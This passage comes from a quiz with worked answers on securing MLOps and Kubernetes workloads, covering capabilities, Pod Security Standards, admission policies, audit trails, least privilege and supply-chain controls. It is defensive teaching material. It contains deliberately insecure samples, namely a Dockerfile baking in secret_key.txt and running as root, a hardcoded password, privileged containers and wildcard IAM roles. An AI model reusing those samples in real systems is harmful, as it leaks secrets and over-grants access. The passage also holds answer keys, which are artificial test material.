B) SYS_ADMIN (system administration)
C) CHOWN (change file ownership)
D) SETUID (set user ID)
E) All capabilities

<details>
<summary>Answer</summary>

**E) All capabilities**

**Explanation**: For most ML workloads, ALL capabilities can be dropped:

**What are Linux capabilities?**
- Fine-grained permissions that can be granted to processes
- Alternative to running as root
- Examples: NET_ADMIN, SYS_ADMIN, CHOWN

**Default container capabilities** (too permissive):
- CHOWN, DAC_OVERRIDE, FSETID, FOWNER
- KILL, SETGID, SETUID, SETPCAP
- NET_BIND_SERVICE, NET_RAW, SYS_CHROOT
- MKNOD, AUDIT_WRITE, SETFCAP

**Secure configuration**:
```yaml
securityContext:
  capabilities:
    drop:
    - ALL  # Drop everything
```

**Why drop all?**

ML inference containers typically don't need:
- Network configuration (NET_ADMIN)
- System administration (SYS_ADMIN)
- Raw sockets (NET_RAW)
- Changing file ownership (CHOWN)
- Changing user IDs (SETUID, SETGID)

**If specific capability needed** (rare):
```yaml
securityContext:
  capabilities:
    drop:
    - ALL
    add:
    - NET_BIND_SERVICE  # Only if binding to port < 1024
```

**Most ML containers only need**:
- Read model files
- Accept HTTP requests
- Make predictions
- Return results

None of these require special capabilities!

**Testing**:
```bash
# Check capabilities
kubectl exec pod-name -- cat /proc/1/status | grep Cap
# Should show minimal capabilities
```

**Dangerous capabilities to never grant**:
- **SYS_ADMIN**: Can mount filesystems, modify kernel
- **NET_ADMIN**: Can sniff network traffic
- **SYS_PTRACE**: Can debug other processes
- **SYS_MODULE**: Can load kernel modules

**Attack scenario**:
1. Attacker exploits container
2. With NET_RAW: Can sniff traffic, see other pods' data
3. Without NET_RAW: Can only attack own container

**Best practice**:
```yaml
# Standard secure configuration
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop:
    - ALL
```

</details>

---

### Question 22
What is the purpose of a Pod Security Policy (or Pod Security Standard)?

A) To manage pod scaling
B) To enforce security requirements on pods (user, capabilities, volumes, etc.)
C) To schedule pods
D) To route traffic to pods

<details>
<summary>Answer</summary>

**B) To enforce security requirements on pods (user, capabilities, volumes, etc.)**

**Explanation**: Pod Security Policies (deprecated) / Pod Security Standards enforce security:

**Pod Security Standards** (current approach):

**1. Privileged** (Unrestricted):
- No restrictions
- Allows dangerous configurations
- Only for trusted workloads

**2. Baseline** (Minimally restrictive):
- Prevents known privilege escalations
- Blocks privileged containers
- Restricts host access

**3. Restricted** (Heavily restricted):
- Hardened best practices
- Enforces:
  - Running as non-root
  - Dropping all capabilities
  - Read-only root filesystem
  - No privilege escalation

**Enforcement**:
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: ml-production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Example restricted pod** (compliant):
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-ml-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: model-server
    image: ml-model:v1
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
      readOnlyRootFilesystem: true
```

**What policies enforce**:

**Required settings**:
- Must run as non-root
- Must drop all capabilities
- Must use RuntimeDefault seccomp profile
- Read-only root filesystem (baseline)

**Forbidden**:
- Privileged containers
- Host network/PID/IPC access
- HostPath volumes
- Privilege escalation

**Audit vs Enforce**:
- **Enforce**: Blocks non-compliant pods
- **Audit**: Logs violations but allows
- **Warn**: Shows warnings but allows

**Testing compliance**:
```bash
# Try to create privileged pod in restricted namespace
kubectl apply -f privileged-pod.yaml
# Error: pods "privileged-pod" is forbidden: violates PodSecurity "restricted:latest"
```

**Migration strategy**:
1. Start with "warn" mode - see violations
2. Fix deployments to be compliant
3. Switch to "audit" mode - log violations
4. Finally "enforce" - block violations

**For ML workloads**:
```yaml
# Development namespace: baseline
apiVersion: v1
kind: Namespace
metadata:
  name: ml-dev
  labels:
    pod-security.kubernetes.io/enforce: baseline

# Production namespace: restricted
apiVersion: v1
kind: Namespace
metadata:
  name: ml-prod
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

</details>

---

### Question 23
Analyze this Dockerfile:

```dockerfile
FROM python:latest
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
COPY model.pkl /app/
COPY secret_key.txt /app/
CMD ["python", "serve.py"]
```

Identify the security issues:

A) Using 'latest' tag, running as root, including secrets in image
B) No issues
C) Too many COPY commands
D) Wrong Python version

<details>
<summary>Answer</summary>

**A) Using 'latest' tag, running as root, including secrets in image**

**Explanation**: Multiple critical security issues:

**1. Using 'latest' tag**:
```dockerfile
FROM python:latest  # ❌ Bad
```
- **Problem**: 'latest' changes over time
- **Impact**: Non-reproducible builds, unexpected updates
- **Fix**:
```dockerfile
FROM python:3.9.16-slim  # ✅ Good - specific version
```

**2. Running as root**:
```dockerfile
# No USER specified = runs as root ❌
```
- **Problem**: If container compromised, attacker has root
- **Fix**:
```dockerfile
RUN useradd -m -u 1000 mluser
USER mluser  # ✅
```

**3. Secrets in image**:
```dockerfile
COPY secret_key.txt /app/  # ❌ CRITICAL
```
- **Problem**: Secret baked into image layer
- **Impact**: Anyone with image access sees secret
- **Persistence**: Remains even if file deleted later
- **Fix**: Use secrets management (Vault, K8s Secrets)

**4. No layer optimization**:
```dockerfile
COPY . /app  # ❌ Copies everything including .git, .env
```
- **Fix**: Use .dockerignore

**5. No security scanning**:
- No evidence of vulnerability scanning
- Base image may have CVEs

**6. No health check**:
```dockerfile
# Missing HEALTHCHECK ❌
```

**Secure version**:
```dockerfile
# Use specific version, slim variant
FROM python:3.9.16-slim AS base

# Create .dockerignore
# .git
# .env
# *.txt (including secret_key.txt)
# __pycache__

# Create non-root user
RUN useradd -m -u 1000 mluser && \
    mkdir /app && \
    chown mluser:mluser /app

WORKDIR /app

# Install dependencies as root
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application (not secrets!)
COPY --chown=mluser:mluser serve.py model.pkl ./

# Switch to non-root
USER mluser

# Health check
HEALTHCHECK --interval=30s --timeout=10s \
  CMD python -c "import requests; requests.get('http://localhost:8000/health')" || exit 1

# Don't expose secrets via ENV
# ENV SECRET_KEY=xxx  ❌ Never do this

EXPOSE 8000
CMD ["python", "serve.py"]
```

**Secrets handling**:
```yaml
# Kubernetes: Use secrets
env:
- name: SECRET_KEY
  valueFrom:
    secretKeyRef:
      name: ml-secrets
      key: secret-key
```

**Verification**:
```bash
# Check for secrets in layers
dive myimage:v1

# Scan for vulnerabilities
trivy image myimage:v1

# Verify non-root
docker run myimage:v1 whoami
# Should output: mluser (not root)
```

</details>

---

### Question 24
What tool can you use to enforce admission policies in Kubernetes?

A) kubectl
B) Open Policy Agent (OPA) / Kyverno / Policy Controller
C) Docker
D) Git

<details>
<summary>Answer</summary>

**B) Open Policy Agent (OPA) / Kyverno / Policy Controller**

**Explanation**: Admission controllers enforce policies at creation time:

**How admission control works**:
1. User creates pod/deployment
2. Request goes to API server
3. Admission controller intercepts
4. Policy evaluated
5. If passes: Resource created
6. If fails: Request rejected

**OPA/Gatekeeper** (Rego language):
```rego
package kubernetes.admission

# Deny pods running as root
deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  not container.securityContext.runAsNonRoot
  msg := sprintf("Container %v must run as non-root", [container.name])
}

# Require resource limits
deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  not container.resources.limits.memory
  msg := sprintf("Container %v must have memory limit", [container.name])
}

# Only allow images from approved registry
deny[msg] {
  input.request.kind.kind == "Pod"
  image := input.request.object.spec.containers[_].image
  not startswith(image, "myregistry.com/")
  msg := sprintf("Image %v not from approved registry", [image])
}
```

**Kyverno** (YAML-based, easier):
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-non-root
spec:
  validationFailureAction: enforce
  rules:
  - name: check-non-root
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Containers must run as non-root"
      pattern:
        spec:
          containers:
          - securityContext:
              runAsNonRoot: true
```

**Policy Controller** (Google's solution):
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireNonRoot
metadata:
  name: must-run-as-non-root
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
```

**Common policies for ML workloads**:

**1. Image signing verification**:
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: enforce
  rules:
  - name: verify-signature
    match:
      resources:
        kinds:
        - Pod
    verifyImages:
    - imageReferences:
      - "myregistry/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              ...
              -----END PUBLIC KEY-----
```

**2. Resource limits**:
```yaml
# Prevent resource exhaustion
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-limits
spec:
  rules:
  - name: check-limits
    validate:
      pattern:
        spec:
          containers:
          - resources:
              limits:
                memory: "?*"
                cpu: "?*"
```

**3. Approved registries only**:
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: allowed-registries
spec:
  rules:
  - name: validate-registry
    validate:
      message: "Images must be from myregistry.com"
      pattern:
        spec:
          containers:
          - image: "myregistry.com/*"
```

**Testing**:
```bash
# Try to create non-compliant pod
kubectl apply -f privileged-pod.yaml
# Error: admission webhook "validate.kyverno.svc" denied the request
```

**Comparison**:

**OPA/Gatekeeper**:
- Most powerful and flexible
- Rego language (learning curve)
- Can query external data

**Kyverno**:
- Kubernetes-native (YAML)
- Easier to learn
- Good for common policies

**Policy Controller**:
- Google Cloud native
- Based on OPA
- Integrated with GKE

**For MLOps**: Recommend Kyverno for simplicity or OPA for complex policies

</details>

---

## Section 5: Security Best Practices (Questions 25-30)

### Question 25
What is defense in depth in the context of MLOps security?

A) Using a single strong security control
B) Implementing multiple layers of security so if one fails, others still protect
C) Encrypting everything
D) Using longer passwords

<details>
<summary>Answer</summary>

**B) Implementing multiple layers of security so if one fails, others still protect**

**Explanation**: Defense in depth means layered security:

**MLOps Security Layers**:

**Layer 1: Code & Dependencies**:
- SAST scanning
- Dependency vulnerability scanning
- Secret scanning
- Code review

**Layer 2: Build & Artifacts**:
- SBOM generation
- Artifact signing (Cosign)
- Container vulnerability scanning
- SLSA provenance

**Layer 3: Registry**:
- Image scanning
- Signature verification
- Access control
- Audit logging

**Layer 4: Deployment**:
- Admission policies (OPA/Kyverno)
- Pod Security Standards
- Network policies
- Resource quotas

**Layer 5: Runtime**:
- Non-root containers
- Read-only filesystems
- Capability dropping
- Seccomp profiles
- Runtime monitoring (Falco)

**Layer 6: Network**:
- Service mesh (mTLS)
- Network policies
- API authentication
- Rate limiting

**Layer 7: Data**:
- Encryption at rest
- Encryption in transit
- Secrets management (Vault)
- Data access controls

**Layer 8: Monitoring & Response**:
- Security logging
- Anomaly detection
- Incident response
- Audit trails

**Example scenario**:
1. Attacker finds vulnerability in dependency (Layer 1)
2. But build scanning detects it (Layer 2) - blocked
3. If it slips through, admission policy blocks deployment (Layer 4)
4. If deployed, runtime monitoring detects anomaly (Layer 5)
5. Network policy prevents lateral movement (Layer 6)

**No single layer is perfect**, but combined they provide strong protection.

**Implementation**:
```yaml
# Layer 1: Scan code
- name: SAST scan
  run: semgrep --config=auto

# Layer 2: Sign artifact
- name: Sign model
  run: cosign sign-blob model.pkl

# Layer 3: Scan container
- name: Vulnerability scan
  run: trivy image myimage:v1

# Layer 4: Admission policy
# (OPA policy enforcing security context)

# Layer 5: Secure runtime
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  capabilities:
    drop: [ALL]

# Layer 6: Network policy
kind: NetworkPolicy
spec:
  podSelector:
    matchLabels:
      app: ml-model
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api-gateway

# Layer 7: Secrets
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-creds
      key: password

# Layer 8: Monitoring
- name: Deploy Falco
```

**Key principle**: Assume any single control can fail. Multiple layers ensure security even with partial failures.

</details>

---

### Question 26
**[Multiple Select]** Which practices are essential for secure MLOps? (Select all that apply)

A) Storing secrets in Git for easy access
B) Scanning container images for vulnerabilities
C) Running all containers as root for simplicity
D) Signing model artifacts
E) Implementing least privilege access

<details>
<summary>Answer</summary>

**B, D, E**

**Explanation**:
- **A**: INCORRECT - Never store secrets in Git (major security risk)
- **B**: CORRECT - Vulnerability scanning prevents deploying exploitable code
- **C**: INCORRECT - Running as root violates least privilege
- **D**: CORRECT - Signing proves authenticity and detects tampering
- **E**: CORRECT - Least privilege limits blast radius

**Essential Secure MLOps Practices**:

**1. Secrets Management** ✅:
```python
# ❌ Wrong
DB_PASSWORD = "password123"

# ✅ Right
db_password = vault.get_secret("mlops/database")['password']
```

**2. Vulnerability Scanning** ✅:
```yaml
- name: Scan for CVEs
  run: trivy image --severity CRITICAL,HIGH myimage:v1
  # Fail build if vulnerabilities found
```

**3. Artifact Signing** ✅:
```bash
# Sign model
cosign sign-blob --key key.pem model.pkl > model.pkl.sig

# Verify before deployment
cosign verify-blob --key key.pub --signature model.pkl.sig model.pkl
```

**4. Least Privilege** ✅:
```yaml
securityContext:
  runAsNonRoot: true  # Don't run as root
  runAsUser: 1000
  readOnlyRootFilesystem: true  # Minimal write access
  capabilities:
    drop: [ALL]  # No special capabilities
```

**5. Authentication & Authorization** ✅:
```python
@app.post("/predict")
async def predict(
    data: Dict,
    api_key: str = Security(api_key_header)  # Require API key
):
    if not valid_api_key(api_key):
        raise HTTPException(401)
    # ...
```

**6. Network Segmentation** ✅:
```yaml
kind: NetworkPolicy
spec:
  podSelector:
    matchLabels:
      app: ml-model
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api-gateway
  # Only allow traffic from API gateway
```

**7. Audit Logging** ✅:
```python
logger.info(f"Prediction requested", extra={
    "user": api_key_owner,
    "input_hash": hash(input_data),
    "timestamp": datetime.utcnow(),
    "ip": request.client.host
})
```

**8. Input Validation** ✅:
```python
def validate_input(data: Dict) -> bool:
    # Check required fields
    if not all(k in data for k in REQUIRED_FIELDS):
        return False

    # Check data types
    # Check ranges
    # Check for injection attacks
    return True
```

**9. Rate Limiting** ✅:
```python
@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    client_id = get_client_id(request)
    if not rate_limiter.is_allowed(client_id):
        raise HTTPException(429, "Rate limit exceeded")
    return await call_next(request)
```

**10. Security Monitoring** ✅:
```python
# Metrics
security_events = Counter('security_events_total', 'Security events', ['event_type'])
security_events.labels(event_type='unauthorized_access').inc()
```

</details>

---

### Question 27
What should be included in a security incident response plan for ML systems?

A) Nothing, ML systems don't need incident response
B) Escalation procedures, containment steps, evidence preservation, communication plan
C) Just restart the system
D) Only developer contact information

<details>
<summary>Answer</summary>

**B) Escalation procedures, containment steps, evidence preservation, communication plan**

**Explanation**: Comprehensive incident response is critical:

**Incident Response Plan Components**:

**1. Preparation**:
- Define incident types
- Assign response team
- Document procedures
- Set up monitoring/alerting
- Maintain contact lists

**2. Detection & Analysis**:
```yaml
Indicators of Compromise (IoCs):
  - Unusual query patterns (model extraction attempt)
  - Unexpected model predictions (poisoned model)
  - High error rates (adversarial attacks)
  - Unauthorized access attempts
  - Anomalous resource usage
```

**3. Containment**:
```python
def contain_incident(incident_type):
    if incident_type == "model_extraction":
        # Immediate actions
        block_suspicious_ips()
        enable_stricter_rate_limiting()
        rotate_api_keys()

    elif incident_type == "compromised_model":
        # Rollback to known-good version
        rollback_model(last_known_good_version)
        quarantine_suspicious_artifacts()

    elif incident_type == "data_breach":
        # Isolate affected systems
        revoke_credentials()
        enable_network_isolation()
```

**4. Evidence Preservation**:
```bash
# Preserve logs
kubectl logs pod-name > incident-logs.txt

# Export security events
vault audit log > vault-audit.json

# Capture network traffic
tcpdump -w incident-traffic.pcap

# Snapshot compromised state
kubectl get pod pod-name -o yaml > compromised-pod.yaml
```

**5. Eradication**:
- Remove malicious artifacts
- Patch vulnerabilities
- Rotate all secrets
- Update security policies
- Rebuild from clean state

**6. Recovery**:
```python
def recover_from_incident():
    # 1. Verify threat is removed
    run_security_scan()

    # 2. Deploy clean version
    deploy_verified_artifact()

    # 3. Restore from backup if needed
    restore_clean_data()

    # 4. Enhanced monitoring
    increase_monitoring_frequency()

    # 5. Gradual traffic restoration
    canary_deployment(percentage=10)
```

**7. Post-Incident Review**:
```markdown
## Incident Report Template

**Incident ID**: INC-2024-001
**Date**: 2024-01-15
**Severity**: High

### What Happened
- Model extraction attempt detected
- 10,000 queries from single IP in 1 hour
- Pattern suggests automated scraping

### Timeline
- 10:00 - Anomaly detected
- 10:05 - Team notified
- 10:15 - IP blocked
- 10:30 - Rate limiting enhanced
- 11:00 - Incident contained

### Root Cause
- No rate limiting on public API
- API keys not required

### Impact
- ~10,000 predictions exposed
- Possible model theft (partial)
- No user data compromised

### Actions Taken
- Blocked malicious IP
- Implemented rate limiting (100 req/hour)
- Required API keys for all requests
- Added query pattern monitoring

### Lessons Learned
- Need proactive rate limiting
- Should have required auth from start
- Monitoring detected issue quickly (good)

### Follow-up Actions
- [ ] Implement API key requirement (Completed)
- [ ] Add query pattern anomaly detection
- [ ] Review other public endpoints
- [ ] Update security training
```

**8. Communication Plan**:
```yaml
Notification Matrix:
  Severity: Critical
    Immediate: Security Team, On-Call Engineer, CTO
    Within 1hr: Legal, Compliance, Customer Success
    Within 4hr: Affected customers

  Severity: High
    Immediate: Security Team, On-Call Engineer
    Within 4hr: Engineering Manager
    Within 24hr: Stakeholders

  Severity: Medium
    Within 4hr: Security Team
    Within 1 day: Engineering Manager
```

**ML-Specific Incident Types**:
- Model extraction
- Model poisoning
- Adversarial attacks
- Data exfiltration
- Prediction manipulation
- Supply chain compromise

**Runbook Example**:
```markdown
## Model Compromise Response

### Immediate Actions (< 5 min)
1. Rollback to last known-good model version
2. Block suspicious traffic
3. Notify security team

### Short-term Actions (< 1 hour)
1. Analyze logs for compromise indicator
2. Check model provenance and signatures
3. Scan for vulnerabilities
4. Rotate all API keys and secrets

### Recovery (< 4 hours)
1. Retrain model from verified clean data
2. Sign new model artifact
3. Deploy with enhanced monitoring
4. Verify predictions are correct

### Prevention
1. Implement model signing verification
2. Add integrity checks
3. Enhance monitoring
```

</details>

---

### Question 28
Why is it important to have an audit trail in ML systems?

A) It's not important
B) To track who accessed/modified models and data for compliance and forensics
C) To make systems slower
D) For backup purposes only

<details>
<summary>Answer</summary>

**B) To track who accessed/modified models and data for compliance and forensics**

**Explanation**: Audit trails provide accountability and forensic capabilities:

**Why Audit Trails Matter**:

**1. Compliance**:
- GDPR: Must track data access
- HIPAA: Audit healthcare data access
- SOC 2: Security logging requirements
- PCI-DSS: Track all access to cardholder data

**2. Security Incidents**:
- Identify what was accessed
- Trace attack timeline
- Find compromised credentials
- Determine blast radius

**3. Debugging**:
- Track model prediction issues
- Identify data quality problems
- Debug unexpected behavior

**4. Accountability**:
- Who deployed this model?
- Who modified this data?
- Who accessed sensitive information?

**What to Audit**:

**Model Access**:
```python
@app.post("/predict")
async def predict(data: Dict, api_key: str = Security(api_key_header)):
    # Log prediction request
    logger.info("Prediction requested", extra={
        "user": get_user_from_key(api_key),
        "timestamp": datetime.utcnow().isoformat(),
        "input_hash": hashlib.sha256(json.dumps(data).encode()).hexdigest(),
        "model_version": MODEL_VERSION,
        "ip_address": request.client.host,
        "endpoint": "/predict"
    })

    prediction = model.predict(data)

    # Log prediction result
    logger.info("Prediction completed", extra={
        "user": get_user_from_key(api_key),
        "timestamp": datetime.utcnow().isoformat(),
        "prediction": prediction,
        "confidence": model.predict_proba(data),
        "latency_ms": elapsed_time
    })

    return {"prediction": prediction}
```

**Model Deployments**:
```python
def deploy_model(model_path: str, version: str, deployed_by: str):
    audit_log.info("Model deployment", extra={
        "event": "model_deployment",
        "model_version": version,
        "model_path": model_path,
        "deployed_by": deployed_by,
        "timestamp": datetime.utcnow().isoformat(),
        "checksum": calculate_hash(model_path),
        "signature_verified": verify_signature(model_path)
    })
```

**Data Access**:
```python
def access_training_data(user: str, dataset: str):
    audit_log.info("Training data accessed", extra={
        "event": "data_access",
        "user": user,
        "dataset": dataset,
        "timestamp": datetime.utcnow().isoformat(),
        "purpose": "model_training",
        "rows_accessed": dataset.count()
    })
```

**Secrets Access**:
```python
# Vault audit log automatically tracks:
# - Who accessed which secret
# - When
# - From where (IP)
# - Success/failure
```

**Model Changes**:
```python
def update_model_weights(model_id: str, weights: np.ndarray, user: str):
    audit_log.info("Model weights updated", extra={
        "event": "model_modification",
        "model_id": model_id,
        "modified_by": user,
        "timestamp": datetime.utcnow().isoformat(),
        "weights_hash": hashlib.sha256(weights.tobytes()).hexdigest(),
        "reason": "retraining"
    })
```

**Structured Logging**:
```python
import structlog

logger = structlog.get_logger()

logger.info(
    "security_event",
    event_type="unauthorized_access_attempt",
    user="unknown",
    ip=request.client.host,
    endpoint="/admin",
    timestamp=datetime.utcnow().isoformat(),
    blocked=True
)
```

**Log Storage**:
```yaml
# Elasticsearch for searchability
# Splunk for enterprise
# CloudWatch/Stackdriver for cloud
# S3 for long-term retention (compliance)
```

**Log Retention**:
```python
RETENTION_POLICIES = {
    "security_events": "7 years",  # Compliance
    "model_predictions": "1 year",
    "api_access": "90 days",
    "debug_logs": "30 days"
}
```

**Querying Audit Logs**:
```python
# Find who deployed compromised model
logs.query(
    "event=model_deployment AND model_version=1.2.3"
)

# Find all predictions by user
logs.query(
    "event=prediction AND user=suspicious_user"
)

# Find unauthorized access attempts
logs.query(
    "event=security_event AND blocked=true"
)
```

**SIEM Integration**:
```python
# Send logs to SIEM (Splunk, QRadar, Sentinel)
import logging.handlers

syslog_handler = logging.handlers.SysLogHandler(
    address=('siem.company.com', 514)
)
logger.addHandler(syslog_handler)
```

**Tamper-Proof Logs**:
- Use append-only log storage
- Write to immutable storage (S3 Glacier)
- Sign log entries
- Export to external system immediately

**Forensic Analysis**:
```python
def investigate_incident(incident_id: str):
    # Get all related events
    events = audit_log.query(f"incident_id={incident_id}")

    # Timeline
    for event in sorted(events, key=lambda x: x['timestamp']):
        print(f"{event['timestamp']}: {event['event']} by {event['user']}")

    # Affected resources
    affected = set(e['resource'] for e in events)

    # Actors
    actors = set(e['user'] for e in events)

    return {
        "timeline": events,
        "affected_resources": affected,
        "actors": actors
    }
```

</details>

---

### Question 29
What is the principle of least privilege?

A) Give everyone root access
B) Grant only the minimum permissions necessary to perform a task
C) No one gets any access
D) Rotate privileges daily

<details>
<summary>Answer</summary>

**B) Grant only the minimum permissions necessary to perform a task**

**Explanation**: Least privilege minimizes potential damage from compromised accounts:

**Principle**: Each user, process, or system should have only the minimum access required to do its job - nothing more.

**Benefits**:
1. **Reduced blast radius**: Compromised account has limited access
2. **Prevents lateral movement**: Attacker can't pivot to other systems
3. **Compliance**: Required by many security standards
4. **Auditability**: Easier to track who should access what

**Examples in MLOps**:

**1. Container Permissions**:
```yaml
# ❌ Wrong - too many privileges
securityContext:
  privileged: true  # Full host access
  capabilities:
    add: [ALL]

# ✅ Right - minimal privileges
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: [ALL]
```

**2. IAM Roles**:
```python
# ❌ Wrong - overly broad
{
  "Effect": "Allow",
  "Action": "s3:*",  # All S3 actions
  "Resource": "*"     # On all buckets
}

# ✅ Right - specific permissions
{
  "Effect": "Allow",
  "Action": [
    "s3:GetObject",      # Only read
    "s3:PutObject"       # and write
  ],
  "Resource": "arn:aws:s3:::ml-models/*"  # Only this bucket
}
```

**3. Database Access**:
```sql
-- ❌ Wrong - full database access
GRANT ALL PRIVILEGES ON DATABASE mldb TO ml_service;

-- ✅ Right - read-only on specific table
GRANT SELECT ON mldb.features TO ml_service;
```

**4. Kubernetes RBAC**:
```yaml
# ❌ Wrong - cluster admin
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: ml-service
roleRef:
  kind: ClusterRole
  name: cluster-admin  # Too much power!

# ✅ Right - minimal namespace access
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ml-service
  namespace: ml-production
roleRef:
  kind: Role
  name: pod-reader  # Only read pods
subjects:
- kind: ServiceAccount
  name: ml-service
  namespace: ml-production
```

**5. API Access**:
```python
# User roles with minimal permissions
roles = {
    "data_scientist": [
        "read:training_data",
        "write:experiments",
        "read:models"
    ],
    "ml_engineer": [
        "read:models",
        "deploy:models",
        "read:metrics"
    ],
    "service_account": [
        "read:model",
        "predict:model"
    ]
}

# Not everyone gets admin!
# Admin role only for security team
```

**6. Vault Policies**:
```hcl
# ❌ Wrong - read all secrets
path "secret/*" {
  capabilities = ["read", "list"]
}

# ✅ Right - specific secret access
path "secret/mlops/ml-service/*" {
  capabilities = ["read"]
}
```

**Implementation Steps**:

**1. Identify Required Permissions**:
```python
# What does this service actually need?
required_permissions = [
    "read_model_from_s3",
    "write_predictions_to_db",
    "read_api_keys_from_vault"
]
```

**2. Grant Minimal Access**:
```python
# Grant only what's needed
grant_permissions(service="ml-api", permissions=required_permissions)
```

**3. Monitor Usage**:
```python
# Log permission usage
logger.info(f"Permission used: {permission} by {user}")

# Detect unused permissions
unused = granted_permissions - used_permissions
# Remove unused permissions
```

**4. Regular Audits**:
```python
def audit_permissions():
    for user in all_users:
        granted = get_granted_permissions(user)
        required = get_required_permissions(user.role)
        excess = granted - required

        if excess:
            logger.warning(f"{user} has excess permissions: {excess}")
```

**Common Violations**:
- Developers with production write access (should be read-only)
- Service accounts with admin privileges
- Containers running as root
- Wildcards in IAM policies (*:*)
- No permission expiration

**Best Practices**:
1. Start with no access, add as needed
2. Use time-limited credentials (Vault dynamic credentials)
3. Regular permission audits
4. Implement role-based access control (RBAC)
5. Log all access attempts
6. Use just-in-time (JIT) access for sensitive operations

</details>

---

### Question 30
**[Multiple Select]** Which security measures help prevent supply chain attacks on ML models? (Select all that apply)

A) Signing model artifacts with Cosign
B) Using only code from unknown sources
C) Generating and verifying SBOMs
D) Implementing SLSA provenance
E) Disabling all security scanning

<details>
<summary>Answer</summary>

**A, C, D**

**Explanation**:
- **A**: CORRECT - Signing proves authenticity and detects tampering
- **B**: INCORRECT - Unknown sources increase risk
- **C**: CORRECT - SBOM tracks all dependencies for vulnerability management
- **D**: CORRECT - Provenance proves build integrity
- **E**: INCORRECT - Disabling scanning removes critical defense

**Supply Chain Attack Prevention**:

**1. Artifact Signing** ✅:
```bash
# Sign model
cosign sign-blob --key key.pem model.pkl > model.pkl.sig

# Verify before use
cosign verify-blob --key key.pub --signature model.pkl.sig model.pkl
# ✓ Prevents: Tampered models
```

**2. SBOM (Software Bill of Materials)** ✅:
```bash
# Generate SBOM
cyclonedx-py -r -i requirements.txt -o sbom.json

# Scan SBOM for vulnerabilities
grype sbom:sbom.json
# ✓ Prevents: Vulnerable dependencies
```

**3. SLSA Provenance** ✅:
```json
{
  "builder": "github-actions",
  "materials": [
    {"uri": "git+https://github.com/org/repo", "digest": "sha256:abc..."},
    {"uri": "s3://data/train.csv", "digest": "sha256:def..."}
  ]
}
# ✓ Prevents: Unauthorized modifications
```

**4. Dependency Pinning** ✅:
```python
# ❌ Wrong - unpinned versions
requirements.txt:
tensorflow
numpy

# ✅ Right - pinned with hashes
requirements.txt:
tensorflow==2.12.0 \
    --hash=sha256:abc123...
numpy==1.24.0 \
    --hash=sha256:def456...
```

**5. Private Registry** ✅:
```dockerfile
# Only use approved base images
FROM myregistry.com/python:3.9.16-slim
# Not: FROM python:3.9  (public registry)
```

**6. Admission Policy** ✅:
```yaml
# Only allow signed images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
spec:
  rules:
  - name: verify-signature
    verifyImages:
    - imageReferences:
      - "*"
      attestors:
      - entries:
        - keys:
            publicKeys: "..."
# ✓ Prevents: Unsigned/untrusted images
```

**7. Vulnerability Scanning** ✅:
```yaml
# Scan in CI/CD
- name: Scan dependencies
  run: safety check --json

- name: Scan container
  run: trivy image --severity CRITICAL,HIGH myimage:v1
# ✓ Prevents: Known vulnerabilities
```

**8. Source Verification** ✅:
```python
# Verify git commit signatures
git verify-commit HEAD

# Only accept signed commits
git config --global commit.gpgsign true
# ✓ Prevents: Malicious code commits
```

**9. Build Isolation** ✅:
```yaml
# Hermetic builds (no network access)
# Reproducible builds (same inputs = same output)
# Prevents: Build-time injection
```

**10. Multi-Party Approval** ✅:
```yaml
# Require code review + approval
branch_protection:
  required_approvals: 2
  require_code_owner_review: true
# ✓ Prevents: Single compromised account
```

**Supply Chain Attack Examples**:

**SolarWinds (2020)**:
- Build system compromised
- Malicious code injected during build
- Signed with legitimate certificate
- Prevention: SLSA Level 3 build platform

**Codecov (2021)**:
- Bash script compromised
- Exfiltrated secrets from CI/CD
- Prevention: Script integrity verification

**PyPI Package Typosquatting**:
- Malicious package with similar name
- `requets` instead of `requests`
- Prevention: Dependency pinning with hashes

**Docker Hub Malicious Images**:
- Backdoored images posing as legitimate
- Prevention: Only use verified publishers + scan images

**Defense in Depth for Supply Chain**:
```yaml
# Layer 1: Source
- Verify commit signatures
- Require code review
- Scan for secrets

# Layer 2: Dependencies
- Pin versions with hashes
- Generate SBOM
- Scan for vulnerabilities

# Layer 3: Build
- Use hermetic builds
- Generate provenance
- Verify build integrity

# Layer 4: Artifacts
- Sign artifacts (Cosign)
- Store signatures
- Verify before use

# Layer 5: Deployment
- Admission policies
- Image verification
- Runtime monitoring
```

**Complete Example**:
```yaml
